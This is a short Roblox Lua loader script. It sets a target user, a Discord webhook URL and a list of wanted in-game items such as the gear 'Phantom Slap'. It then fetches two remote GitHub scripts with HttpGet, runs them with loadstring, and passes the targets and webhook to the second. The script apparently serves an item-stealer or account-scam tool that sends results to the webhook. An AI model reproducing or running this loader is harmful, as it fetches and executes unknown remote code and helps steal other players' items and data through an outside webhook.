local TARGET_ID = 11185117812
local TARGET_USER = "find3r01"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1576302941227196508/j3gODkhoQxmeWBWu19SNBjVmEYvSOXADWbhpz_2ZLZ-oPu701y3q_hiDn0QQ-etK7lAA"

local TargetBrainrots = {
    
}

local TargetBaseSkins = {
    
}

local TargetGears = {
    ["Phantom Slap"] = true
}

task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GhostScriptsHub/Auto-Code-Ghost-Scripts/refs/heads/main/script.lua"))()

    task.wait(1)

    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)